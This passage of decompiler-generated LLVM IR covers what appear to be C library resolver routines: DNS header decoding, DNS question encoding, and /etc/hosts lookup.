  %v1_8067f87 = add i32 %v0_8067f87, 33
  %v2_8067f87 = inttoptr i32 %v1_8067f87 to i8*
  %v3_8067f87 = load i8, i8* %v2_8067f87, align 1
  %v2_8067f8b = load i32, i32* %edi.global-to-local, align 4
  %v3_8067f8b = add i32 %v2_8067f8b, 4
  %v4_8067f8b = inttoptr i32 %v3_8067f8b to i8*
  store i8 %v3_8067f87, i8* %v4_8067f8b, align 1
  %v0_8067f8e = load i32, i32* %esi.global-to-local, align 4
  %v1_8067f8e = add i32 %v0_8067f8e, 32
  %v2_8067f8e = inttoptr i32 %v1_8067f8e to i32*
  %v3_8067f8e = load i32, i32* %v2_8067f8e, align 4
  %v1_8067f91 = trunc i32 %v3_8067f8e to i8
  %v2_8067f91 = load i32, i32* %edi.global-to-local, align 4
  %v3_8067f91 = add i32 %v2_8067f91, 5
  %v4_8067f91 = inttoptr i32 %v3_8067f91 to i8*
  store i8 %v1_8067f91, i8* %v4_8067f91, align 1
  %v0_8067f94 = load i32, i32* %esi.global-to-local, align 4
  %v1_8067f94 = add i32 %v0_8067f94, 37
  %v2_8067f94 = inttoptr i32 %v1_8067f94 to i8*
  %v3_8067f94 = load i8, i8* %v2_8067f94, align 1
  %v2_8067f98 = load i32, i32* %edi.global-to-local, align 4
  %v3_8067f98 = add i32 %v2_8067f98, 6
  %v4_8067f98 = inttoptr i32 %v3_8067f98 to i8*
  store i8 %v3_8067f94, i8* %v4_8067f98, align 1
  %v0_8067f9b = load i32, i32* %esi.global-to-local, align 4
  %v1_8067f9b = add i32 %v0_8067f9b, 36
  %v2_8067f9b = inttoptr i32 %v1_8067f9b to i32*
  %v3_8067f9b = load i32, i32* %v2_8067f9b, align 4
  %v1_8067f9e = trunc i32 %v3_8067f9b to i8
  %v2_8067f9e = load i32, i32* %edi.global-to-local, align 4
  %v3_8067f9e = add i32 %v2_8067f9e, 7
  %v4_8067f9e = inttoptr i32 %v3_8067f9e to i8*
  store i8 %v1_8067f9e, i8* %v4_8067f9e, align 1
  %v0_8067fa1 = load i32, i32* %esi.global-to-local, align 4
  %v1_8067fa1 = add i32 %v0_8067fa1, 41
  %v2_8067fa1 = inttoptr i32 %v1_8067fa1 to i8*
  %v3_8067fa1 = load i8, i8* %v2_8067fa1, align 1
  %v2_8067fa5 = load i32, i32* %edi.global-to-local, align 4
  %v3_8067fa5 = add i32 %v2_8067fa5, 8
  %v4_8067fa5 = inttoptr i32 %v3_8067fa5 to i8*
  store i8 %v3_8067fa1, i8* %v4_8067fa5, align 1
  %v0_8067fa8 = load i32, i32* %esi.global-to-local, align 4
  %v1_8067fa8 = add i32 %v0_8067fa8, 40
  %v2_8067fa8 = inttoptr i32 %v1_8067fa8 to i32*
  %v3_8067fa8 = load i32, i32* %v2_8067fa8, align 4
  %v1_8067fab = trunc i32 %v3_8067fa8 to i8
  %v2_8067fab = load i32, i32* %edi.global-to-local, align 4
  %v3_8067fab = add i32 %v2_8067fab, 9
  %v4_8067fab = inttoptr i32 %v3_8067fab to i8*
  store i8 %v1_8067fab, i8* %v4_8067fab, align 1
  %v0_8067fae = load i32, i32* %esi.global-to-local, align 4
  %v1_8067fae = add i32 %v0_8067fae, 45
  %v2_8067fae = inttoptr i32 %v1_8067fae to i8*
  %v3_8067fae = load i8, i8* %v2_8067fae, align 1
  %v2_8067fb2 = load i32, i32* %edi.global-to-local, align 4
  %v3_8067fb2 = add i32 %v2_8067fb2, 10
  %v4_8067fb2 = inttoptr i32 %v3_8067fb2 to i8*
  store i8 %v3_8067fae, i8* %v4_8067fb2, align 1
  %v0_8067fb5 = load i32, i32* %esi.global-to-local, align 4
  %v1_8067fb5 = add i32 %v0_8067fb5, 44
  %v2_8067fb5 = inttoptr i32 %v1_8067fb5 to i32*
  %v3_8067fb5 = load i32, i32* %v2_8067fb5, align 4
  %v1_8067fb8 = trunc i32 %v3_8067fb5 to i8
  %v2_8067fb8 = load i32, i32* %edi.global-to-local, align 4
  %v3_8067fb8 = add i32 %v2_8067fb8, 11
  %v4_8067fb8 = inttoptr i32 %v3_8067fb8 to i8*
  store i8 %v1_8067fb8, i8* %v4_8067fb8, align 1
  br label %dec_label_pc_8067fc0

dec_label_pc_8067fc0:                             ; preds = %entry, %dec_label_pc_8067f28
  %v0_8067fc6 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_8067f28 ]
  ret i32 %v0_8067fc6

; uselistorder directives
  uselistorder i32 %v1_8067f54, { 1, 0 }
  uselistorder i32 45, { 4, 3, 1, 0, 2 }
  uselistorder i32 41, { 2, 1, 0 }
  uselistorder i32 37, { 3, 1, 2, 4, 0 }
  uselistorder i32 33, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 -256, { 12, 36, 0, 35, 1, 40, 41, 16, 17, 42, 2, 43, 3, 45, 44, 4, 18, 71, 6, 23, 22, 5, 8, 28, 27, 7, 46, 47, 72, 29, 38, 37, 48, 49, 50, 51, 52, 13, 53, 54, 55, 56, 57, 39, 73, 31, 30, 9, 32, 14, 26, 15, 33, 20, 21, 19, 74, 75, 25, 24, 10, 68, 69, 34, 70, 58, 59, 60, 61, 62, 63, 64, 11, 65, 66, 67 }
  uselistorder i32 120, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8067fc0, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8067fc8 = load i32, i32* @ebx, align 4
  store i32 %v0_8067fc8, i32* %stack_var_-4, align 4
  %v4_8067fc9 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8067fc9, i32* %ecx.global-to-local, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8067fd1 = load i8, i8* %tmp2, align 1
  %v3_8067fd1 = zext i8 %v2_8067fd1 to i32
  %v1_8067fd4 = add i32 %v4_8067fc9, 1
  %v2_8067fd4 = inttoptr i32 %v1_8067fd4 to i8*
  %v3_8067fd4 = load i8, i8* %v2_8067fd4, align 1
  %v4_8067fd4 = zext i8 %v3_8067fd4 to i32
  %v2_8067fd8 = mul nuw nsw i32 %v3_8067fd1, 256
  %v2_8067fdb = or i32 %v4_8067fd4, %v2_8067fd8
  %v2_8067fdd = inttoptr i32 %tmp to i32*
  store i32 %v2_8067fdb, i32* %v2_8067fdd, align 4
  %v0_8067fdf = load i32, i32* %ecx.global-to-local, align 4
  %v1_8067fdf = add i32 %v0_8067fdf, 2
  %v2_8067fdf = inttoptr i32 %v1_8067fdf to i8*
  %v3_8067fdf = load i8, i8* %v2_8067fdf, align 1
  %tmp6 = icmp slt i8 %v3_8067fdf, 0
  %v2_8067fe3 = zext i1 %tmp6 to i32
  %v1_8067fe6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8067fe6 = add i32 %v1_8067fe6, 4
  %v3_8067fe6 = inttoptr i32 %v2_8067fe6 to i32*
  store i32 %v2_8067fe3, i32* %v3_8067fe6, align 4
  %v0_8067fe9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8067fe9 = add i32 %v0_8067fe9, 2
  %v2_8067fe9 = inttoptr i32 %v1_8067fe9 to i8*
  %v3_8067fe9 = load i8, i8* %v2_8067fe9, align 1
  %v3_8067fec = udiv i8 %v3_8067fe9, 8
  %tmp7 = urem i8 %v3_8067fec, 16
  %v1_8067ff2 = zext i8 %tmp7 to i32
  %v1_8067ff5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8067ff5 = add i32 %v1_8067ff5, 8
  %v3_8067ff5 = inttoptr i32 %v2_8067ff5 to i32*
  store i32 %v1_8067ff2, i32* %v3_8067ff5, align 4
  %v0_8067ff8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8067ff8 = add i32 %v0_8067ff8, 2
  %v2_8067ff8 = inttoptr i32 %v1_8067ff8 to i8*
  %v3_8067ff8 = load i8, i8* %v2_8067ff8, align 1
  %div = udiv i8 %v3_8067ff8, 4
  %tmp8 = urem i8 %div, 2
  %v1_8067fff = zext i8 %tmp8 to i32
  %v1_8068002 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8068002 = add i32 %v1_8068002, 12
  %v3_8068002 = inttoptr i32 %v2_8068002 to i32*
  store i32 %v1_8067fff, i32* %v3_8068002, align 4
  %v0_8068005 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8068005 = add i32 %v0_8068005, 2
  %v2_8068005 = inttoptr i32 %v1_8068005 to i8*
  %v3_8068005 = load i8, i8* %v2_8068005, align 1
  %div5 = udiv i8 %v3_8068005, 2
  %tmp9 = urem i8 %div5, 2
  %v1_806800b = zext i8 %tmp9 to i32
  %v1_806800e = load i32, i32* %ebx.global-to-local, align 4
  %v2_806800e = add i32 %v1_806800e, 16
  %v3_806800e = inttoptr i32 %v2_806800e to i32*
  store i32 %v1_806800b, i32* %v3_806800e, align 4
  %v0_8068011 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8068011 = add i32 %v0_8068011, 2
  %v2_8068011 = inttoptr i32 %v1_8068011 to i8*
  %v3_8068011 = load i8, i8* %v2_8068011, align 1
  %tmp10 = urem i8 %v3_8068011, 2
  %v1_8068015 = zext i8 %tmp10 to i32
  %v1_8068018 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8068018 = add i32 %v1_8068018, 20
  %v3_8068018 = inttoptr i32 %v2_8068018 to i32*
  store i32 %v1_8068015, i32* %v3_8068018, align 4
  %v0_806801b = load i32, i32* %ecx.global-to-local, align 4
  %v1_806801b = add i32 %v0_806801b, 3
  %v2_806801b = inttoptr i32 %v1_806801b to i8*
  %v3_806801b = load i8, i8* %v2_806801b, align 1
  %tmp11 = icmp slt i8 %v3_806801b, 0
  %v2_806801f = zext i1 %tmp11 to i32
  %v1_8068022 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8068022 = add i32 %v1_8068022, 24
  %v3_8068022 = inttoptr i32 %v2_8068022 to i32*
  store i32 %v2_806801f, i32* %v3_8068022, align 4
  %v0_8068025 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8068025 = add i32 %v0_8068025, 3
  %v2_8068025 = inttoptr i32 %v1_8068025 to i8*
  %v3_8068025 = load i8, i8* %v2_8068025, align 1
  %tmp12 = urem i8 %v3_8068025, 16
  %v1_8068029 = zext i8 %tmp12 to i32
  %v1_806802c = load i32, i32* %ebx.global-to-local, align 4
  %v2_806802c = add i32 %v1_806802c, 28
  %v3_806802c = inttoptr i32 %v2_806802c to i32*
  store i32 %v1_8068029, i32* %v3_806802c, align 4
  %v0_806802f = load i32, i32* %ecx.global-to-local, align 4
  %v1_806802f = add i32 %v0_806802f, 4
  %v2_806802f = inttoptr i32 %v1_806802f to i8*
  %v3_806802f = load i8, i8* %v2_806802f, align 1
  %v4_806802f = zext i8 %v3_806802f to i32
  %v1_8068033 = add i32 %v0_806802f, 5
  %v2_8068033 = inttoptr i32 %v1_8068033 to i8*
  %v3_8068033 = load i8, i8* %v2_8068033, align 1
  %v4_8068033 = zext i8 %v3_8068033 to i32
  %v2_8068037 = mul nuw nsw i32 %v4_806802f, 256
  %v2_806803a = or i32 %v4_8068033, %v2_8068037
  %v1_806803c = load i32, i32* %ebx.global-to-local, align 4
  %v2_806803c = add i32 %v1_806803c, 32
  %v3_806803c = inttoptr i32 %v2_806803c to i32*
  store i32 %v2_806803a, i32* %v3_806803c, align 4
  %v0_806803f = load i32, i32* %ecx.global-to-local, align 4
  %v1_806803f = add i32 %v0_806803f, 6
  %v2_806803f = inttoptr i32 %v1_806803f to i8*
  %v3_806803f = load i8, i8* %v2_806803f, align 1
  %v4_806803f = zext i8 %v3_806803f to i32
  %v1_8068043 = add i32 %v0_806803f, 7
  %v2_8068043 = inttoptr i32 %v1_8068043 to i8*
  %v3_8068043 = load i8, i8* %v2_8068043, align 1
  %v4_8068043 = zext i8 %v3_8068043 to i32
  %v2_8068047 = mul nuw nsw i32 %v4_806803f, 256
  %v2_806804a = or i32 %v4_8068043, %v2_8068047
  %v1_806804c = load i32, i32* %ebx.global-to-local, align 4
  %v2_806804c = add i32 %v1_806804c, 36
  %v3_806804c = inttoptr i32 %v2_806804c to i32*
  store i32 %v2_806804a, i32* %v3_806804c, align 4
  %v0_806804f = load i32, i32* %ecx.global-to-local, align 4
  %v1_806804f = add i32 %v0_806804f, 8
  %v2_806804f = inttoptr i32 %v1_806804f to i8*
  %v3_806804f = load i8, i8* %v2_806804f, align 1
  %v4_806804f = zext i8 %v3_806804f to i32
  %v1_8068053 = add i32 %v0_806804f, 9
  %v2_8068053 = inttoptr i32 %v1_8068053 to i8*
  %v3_8068053 = load i8, i8* %v2_8068053, align 1
  %v4_8068053 = zext i8 %v3_8068053 to i32
  %v2_8068057 = mul nuw nsw i32 %v4_806804f, 256
  %v2_806805a = or i32 %v4_8068053, %v2_8068057
  %v1_806805c = load i32, i32* %ebx.global-to-local, align 4
  %v2_806805c = add i32 %v1_806805c, 40
  %v3_806805c = inttoptr i32 %v2_806805c to i32*
  store i32 %v2_806805a, i32* %v3_806805c, align 4
  %v0_806805f = load i32, i32* %ecx.global-to-local, align 4
  %v1_806805f = add i32 %v0_806805f, 10
  %v2_806805f = inttoptr i32 %v1_806805f to i8*
  %v3_806805f = load i8, i8* %v2_806805f, align 1
  %v4_806805f = zext i8 %v3_806805f to i32
  %v1_8068063 = add i32 %v0_806805f, 11
  %v2_8068063 = inttoptr i32 %v1_8068063 to i8*
  %v3_8068063 = load i8, i8* %v2_8068063, align 1
  %v4_8068063 = zext i8 %v3_8068063 to i32
  %v2_8068067 = mul nuw nsw i32 %v4_806805f, 256
  %v2_806806a = or i32 %v4_8068063, %v2_8068067
  %v1_806806c = load i32, i32* %ebx.global-to-local, align 4
  %v2_806806c = add i32 %v1_806806c, 44
  %v3_806806c = inttoptr i32 %v2_806806c to i32*
  store i32 %v2_806806a, i32* %v3_806806c, align 4
  %v2_806806f = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_806806f, i32* @ebx, align 4
  ret i32 %v2_806806a

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 10, 6, 7, 8, 9, 11 }
  uselistorder i32 44, { 11, 12, 16, 17, 1, 18, 7, 19, 20, 13, 14, 8, 9, 10, 29, 15, 6, 25, 26, 27, 28, 22, 23, 24, 21, 2, 3, 4, 5, 0 }
  uselistorder i32 11, { 10, 11, 5, 12, 0, 9, 18, 2, 6, 7, 13, 14, 15, 16, 8, 17, 4, 3, 1 }
  uselistorder i32 40, { 6, 7, 1, 10, 11, 4, 9, 2, 3, 8, 12, 14, 13, 15, 16, 5, 0 }
  uselistorder i32 36, { 10, 11, 14, 15, 16, 17, 18, 4, 19, 20, 12, 9, 1, 5, 13, 7, 6, 8, 21, 22, 23, 24, 3, 2, 0 }
  uselistorder i32 7, { 15, 16, 8, 9, 6, 0, 1, 2, 12, 10, 7, 13, 17, 18, 19, 20, 21, 11, 3, 4, 14, 5 }
  uselistorder i32 6, { 20, 21, 0, 1, 8, 22, 4, 14, 9, 10, 25, 11, 12, 23, 5, 24, 3, 6, 7, 18, 13, 15, 16, 17, 19, 2 }
  uselistorder i32 28, { 35, 36, 39, 40, 6, 0, 1, 46, 2, 47, 48, 50, 49, 51, 52, 7, 14, 24, 43, 53, 37, 38, 25, 26, 27, 63, 64, 41, 42, 34, 3, 11, 44, 54, 45, 33, 9, 28, 8, 10, 22, 55, 56, 57, 58, 59, 60, 61, 5, 62, 65, 29, 30, 12, 13, 31, 19, 18, 16, 17, 23, 20, 21, 32, 15, 4 }
  uselistorder i32 20, { 35, 36, 45, 41, 4, 46, 37, 38, 11, 12, 13, 57, 39, 40, 34, 42, 43, 5, 0, 47, 48, 44, 31, 32, 33, 14, 15, 16, 58, 27, 28, 29, 30, 3, 10, 9, 49, 50, 51, 2, 52, 53, 54, 6, 55, 56, 59, 17, 18, 19, 20, 21, 22, 23, 24, 25, 7, 26, 8, 1 }
  uselistorder i8 2, { 1, 2, 3, 4, 5, 6, 19, 7, 8, 0, 23, 20, 9, 10, 11, 12, 13, 21, 22, 14, 15, 16, 18, 17 }
  uselistorder i8 4, { 0, 6, 2, 1, 3, 7, 5, 4 }
  uselistorder i8 16, { 0, 1, 2, 4, 3 }
  uselistorder i8 8, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder i32 256, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 54, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 53, 26, 0, 1, 27, 2, 28, 29, 30, 31, 33, 32, 50, 34, 52, 35, 36, 3, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 51, 49 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8068074 = load i32, i32* @edi, align 4
  %v0_8068075 = load i32, i32* @esi, align 4
  %v0_8068076 = load i32, i32* @ebx, align 4
  store i32 %v0_8068076, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @ebx, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v0_8068083 = load i32, i32* @eax, align 4
  %v1_8068086 = inttoptr i32 %tmp to i32*
  %v2_8068086 = load i32, i32* %v1_8068086, align 4
  %v7_8068088 = inttoptr i32 %v2_8068086 to i8*
  %v8_8068088 = call i32 @__encode_dotted(i8* %v7_8068088, i32 %tmp2, i32 %tmp3, i32 %v0_8068083, i32 %v0_8068076, i32 %v0_8068075, i32 %v0_8068074)
  %v2_8068090 = icmp slt i32 %v8_8068088, 0
  store i32 %v8_8068088, i32* %ecx.global-to-local, align 4
  br i1 %v2_8068090, label %dec_label_pc_80680c1, label %dec_label_pc_8068096

dec_label_pc_8068096:                             ; preds = %entry
  %v0_8068096 = load i32, i32* @ebx, align 4
  %v2_8068096 = sub i32 %v0_8068096, %v8_8068088
  %v1_8068098 = add i32 %v2_8068096, -3
  %v6_8068098 = sub i32 2, %v2_8068096
  %v7_8068098 = and i32 %v6_8068098, %v2_8068096
  %v8_8068098 = icmp slt i32 %v7_8068098, 0
  %v9_8068098 = icmp eq i32 %v1_8068098, 0
  %v10_8068098 = icmp slt i32 %v1_8068098, 0
  %v3_806809b = icmp eq i1 %v10_8068098, %v8_8068098
  %v4_806809b = icmp eq i1 %v9_8068098, false
  %v5_806809b = and i1 %v4_806809b, %v3_806809b
  br i1 %v5_806809b, label %dec_label_pc_80680a2, label %dec_label_pc_806809d

dec_label_pc_806809d:                             ; preds = %dec_label_pc_8068096
  store i32 -1, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80680c1

dec_label_pc_80680a2:                             ; preds = %dec_label_pc_8068096
  %v0_80680a2 = load i32, i32* @edi, align 4
  %v2_80680a2 = add i32 %v0_80680a2, %v8_8068088
  store i32 %v2_80680a2, i32* %edx.global-to-local, align 4
  %v0_80680a5 = load i32, i32* @esi, align 4
  %v1_80680a5 = add i32 %v0_80680a5, 5
  %v2_80680a5 = inttoptr i32 %v1_80680a5 to i8*
  %v3_80680a5 = load i8, i8* %v2_80680a5, align 1
  %v1_80680a9 = add i32 %v8_8068088, 4
  store i32 %v1_80680a9, i32* %ecx.global-to-local, align 4
  %v3_80680ac = inttoptr i32 %v2_80680a2 to i8*
  store i8 %v3_80680a5, i8* %v3_80680ac, align 1
  %v0_80680ae = load i32, i32* @esi, align 4
  %v1_80680ae = add i32 %v0_80680ae, 4
  %v2_80680ae = inttoptr i32 %v1_80680ae to i32*
  %v3_80680ae = load i32, i32* %v2_80680ae, align 4
  %v1_80680b1 = trunc i32 %v3_80680ae to i8
  %v2_80680b1 = load i32, i32* %edx.global-to-local, align 4
  %v3_80680b1 = add i32 %v2_80680b1, 1
  %v4_80680b1 = inttoptr i32 %v3_80680b1 to i8*
  store i8 %v1_80680b1, i8* %v4_80680b1, align 1
  %v0_80680b4 = load i32, i32* @esi, align 4
  %v1_80680b4 = add i32 %v0_80680b4, 9
  %v2_80680b4 = inttoptr i32 %v1_80680b4 to i8*
  %v3_80680b4 = load i8, i8* %v2_80680b4, align 1
  %v2_80680b8 = load i32, i32* %edx.global-to-local, align 4
  %v3_80680b8 = add i32 %v2_80680b8, 2
  %v4_80680b8 = inttoptr i32 %v3_80680b8 to i8*
  store i8 %v3_80680b4, i8* %v4_80680b8, align 1
  %v0_80680bb = load i32, i32* @esi, align 4
  %v1_80680bb = add i32 %v0_80680bb, 8
  %v2_80680bb = inttoptr i32 %v1_80680bb to i32*
  %v3_80680bb = load i32, i32* %v2_80680bb, align 4
  %v1_80680be = trunc i32 %v3_80680bb to i8
  %v2_80680be = load i32, i32* %edx.global-to-local, align 4
  %v3_80680be = add i32 %v2_80680be, 3
  %v4_80680be = inttoptr i32 %v3_80680be to i8*
  store i8 %v1_80680be, i8* %v4_80680be, align 1
  %v0_80680c2.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80680c1

dec_label_pc_80680c1:                             ; preds = %entry, %dec_label_pc_806809d, %dec_label_pc_80680a2
  %v0_80680c2 = phi i32 [ %v8_8068088, %entry ], [ -1, %dec_label_pc_806809d ], [ %v0_80680c2.pre, %dec_label_pc_80680a2 ]
  %v2_80680c1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80680c1, i32* @ebx, align 4
  store i32 %v0_8068074, i32* @edi, align 4
  ret i32 %v0_80680c2

; uselistorder directives
  uselistorder i32 %v1_8068098, { 1, 0 }
  uselistorder i32 %v2_8068096, { 0, 2, 1 }
  uselistorder i32 %v8_8068088, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 9, { 15, 16, 17, 19, 8, 18, 0, 1, 20, 21, 6, 7, 13, 3, 9, 10, 22, 23, 24, 25, 11, 12, 4, 14, 2, 5 }
  uselistorder i32 5, { 17, 18, 19, 0, 1, 14, 16, 8, 9, 10, 23, 24, 4, 3, 20, 15, 21, 22, 11, 13, 7, 6, 5, 12, 2 }
  uselistorder i32 -3, { 3, 4, 2, 1, 9, 8, 5, 6, 0, 7 }
  uselistorder label %dec_label_pc_80680c1, { 2, 1, 0 }
}

define i32 @__open_etc_hosts(i32 %arg1) local_unnamed_addr {
entry:
  %v2_80680d0 = call i32 @__GI_config_open(i32 ptrtoint ([11 x i8]* @global_var_8070434.1732 to i32))
  ret i32 %v2_80680d0

; uselistorder directives
  uselistorder i32 (i32)* @__GI_config_open, { 0, 2, 1 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp38 = ptrtoint i32* %arg5 to i32
  %stack_var_-20 = alloca i32, align 4
  %v0_80680d9 = load i32, i32* @ebp, align 4
  %v0_80680da = load i32, i32* @edi, align 4
  %v0_80680db = load i32, i32* @esi, align 4
  %v0_80680dc = load i32, i32* @ebx, align 4
  store i32 %arg7, i32* @ebx, align 4
  store i32 %arg9, i32* @esi, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %tmp38, i32* @ebp, align 4
  %v1_80680f6 = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_80680f6, align 4
  %tmp = icmp ult i32 %arg7, 129
  br i1 %tmp, label %dec_label_pc_806829f, label %dec_label_pc_806810a

dec_label_pc_806810a:                             ; preds = %entry
  %v0_806810a = load i32, i32* @edi, align 4
  %v1_806810a = icmp eq i32 %v0_806810a, 0
  store i32 0, i32* %stack_var_-20, align 4
  %v1_8068114 = icmp eq i1 %v1_806810a, false
  br i1 %v1_8068114, label %dec_label_pc_806813c, label %dec_label_pc_8068116

dec_label_pc_8068116:                             ; preds = %dec_label_pc_806810a
  %v1_8068116 = call i32 @__open_etc_hosts(i32 34)
  store i32 %v1_8068116, i32* %eax.global-to-local, align 4
  %v1_806811b = icmp eq i32 %v1_8068116, 0
  store i32 %v1_8068116, i32* @edi, align 4
  %v1_806811f = icmp eq i1 %v1_806811b, false
  br i1 %v1_806811f, label %dec_label_pc_806813c, label %dec_label_pc_8068121

dec_label_pc_8068121:                             ; preds = %dec_label_pc_8068116
  %v1_8068125 = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8068125, align 4
  store i32 -8, i32* %eax.global-to-local, align 4
  %v2_8068130 = load i32, i32* inttoptr (i32 -8 to i32*), align 8
  store i32 %v2_8068130, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806829f

dec_label_pc_806813c:                             ; preds = %dec_label_pc_8068116, %dec_label_pc_806810a
  %v0_8068143 = phi i32 [ %v1_8068116, %dec_label_pc_8068116 ], [ %v0_806810a, %dec_label_pc_806810a ]
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v0_8068140 = load i32, i32* @ebx, align 4
  %v1_8068140 = add i32 %v0_8068140, -48
  store i32 %v1_8068140, i32* %eax.global-to-local, align 4
  %v1_8068143 = add i32 %v0_8068143, 8
  %v2_8068143 = inttoptr i32 %v1_8068143 to i32*
  store i32 48, i32* %v2_8068143, align 4
  %v0_806814a = load i32, i32* %eax.global-to-local, align 4
  %v1_806814a = load i32, i32* @edi, align 4
  %v2_806814a = add i32 %v1_806814a, 16
  %v3_806814a = inttoptr i32 %v2_806814a to i32*
  store i32 %v0_806814a, i32* %v3_806814a, align 4
  %v0_8068155 = load i32, i32* %edx.global-to-local, align 4
  %v1_8068155 = load i32, i32* @edi, align 4
  %v2_8068155 = add i32 %v1_8068155, 4
  %v3_8068155 = inttoptr i32 %v2_8068155 to i32*
  store i32 %v0_8068155, i32* %v3_8068155, align 4
  %v0_8068158 = load i32, i32* %edx.global-to-local, align 4
  %v1_8068158 = add i32 %v0_8068158, 24
  store i32 %v1_8068158, i32* @edx, align 4
  %v0_806815b = load i32, i32* @esi, align 4
  %v1_806815b = inttoptr i32 %v0_806815b to i32*
  store i32 1, i32* %v1_806815b, align 4
  %v0_8068161 = load i32, i32* @edx, align 4
  %v2_806826a = ptrtoint i32* %stack_var_-20 to i32
  %v12_8068171 = icmp eq i32 %arg4, 1
  %v12_8068181 = icmp eq i32 %arg4, 2
  %v5_80681b5 = inttoptr i32 %arg2 to i8*
  %v1_80681da = add i32 %v0_8068161, 4
  %v2_80681da = inttoptr i32 %v1_80681da to i32*
  %v1_80681ec = add i32 %arg6, 32
  %v12_80681ef = icmp eq i32 %arg3, 2
  %v12_8068225 = icmp eq i32 %arg3, 10
  %v1_8068186 = icmp eq i1 %v12_8068181, false
  %v2_80681f4 = add i32 %arg6, 24
  %v3_80681f4 = inttoptr i32 %v2_80681f4 to i32*
  %v1_80681f7 = icmp eq i1 %v12_80681ef, false
  %v1_806822a = icmp eq i1 %v12_8068225, false
  br label %dec_label_pc_8068260.outer

dec_label_pc_8068260.outer:                       ; preds = %dec_label_pc_80681f9, %dec_label_pc_8068225, %dec_label_pc_806822c, %dec_label_pc_806813c
  %stack_var_-36.0.ph = phi i32 [ 1, %dec_label_pc_806813c ], [ 2, %dec_label_pc_806822c ], [ 2, %dec_label_pc_8068225 ], [ 2, %dec_label_pc_80681f9 ]
  br label %dec_label_pc_8068260

dec_label_pc_806816a:                             ; preds = %dec_label_pc_8068260
  %v3_806816a = load i32, i32* %stack_var_-20, align 4
  %v1_806816e = add i32 %v3_806816a, 4
  store i32 %v1_806816e, i32* @ebx, align 4
  %v1_8068176 = load i32, i32* @ebp, align 4
  %v2_8068176 = add i32 %v1_8068176, 4
  %v3_8068176 = inttoptr i32 %v2_8068176 to i32*
  store i32 %v1_806816e, i32* %v3_8068176, align 4
  br i1 %v12_8068171, label %dec_label_pc_806829f, label %dec_label_pc_806817f

dec_label_pc_806817f:                             ; preds = %dec_label_pc_806816a
  store i32 0, i32* @esi, align 4
  br i1 %v1_8068186, label %dec_label_pc_80681c1.preheader, label %dec_label_pc_8068188

dec_label_pc_80681c1.preheader:                   ; preds = %dec_label_pc_806817f
  br label %dec_label_pc_80681a6

dec_label_pc_8068188:                             ; preds = %dec_label_pc_806817f
  %v3_806818a = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_806818a, i32* @eax, align 4
  %v1_806818e = inttoptr i32 %v3_806818a to i32*
  %v2_806818e = load i32, i32* %v1_806818e, align 4
  %v3_8068194 = call i32 @__GI_strcoll(i8* %v5_80681b5, i32 %v2_806818e)
  store i32 %v3_8068194, i32* %eax.global-to-local, align 4
  %v1_806819c = icmp eq i32 %v3_8068194, 0
  %v1_806819e = icmp eq i1 %v1_806819c, false
  br i1 %v1_806819e, label %dec_label_pc_8068260, label %dec_label_pc_80681cb

dec_label_pc_80681a6:                             ; preds = %dec_label_pc_80681c1.preheader, %dec_label_pc_80681c1.backedge
  %v1_80681a659 = phi i32 [ 0, %dec_label_pc_80681c1.preheader ], [ %v1_80681a6.be, %dec_label_pc_80681c1.backedge ]
  %v0_80681a6 = load i32, i32* @ebx, align 4
  %v2_80681a6 = mul i32 %v1_80681a659, 4
  %v3_80681a6 = add i32 %v0_80681a6, %v2_80681a6
  %v4_80681a6 = inttoptr i32 %v3_80681a6 to i32*
  %v5_80681a6 = load i32, i32* %v4_80681a6, align 4
  store i32 %v5_80681a6, i32* %eax.global-to-local, align 4
  %v1_80681a9 = add i32 %v1_80681a659, 1
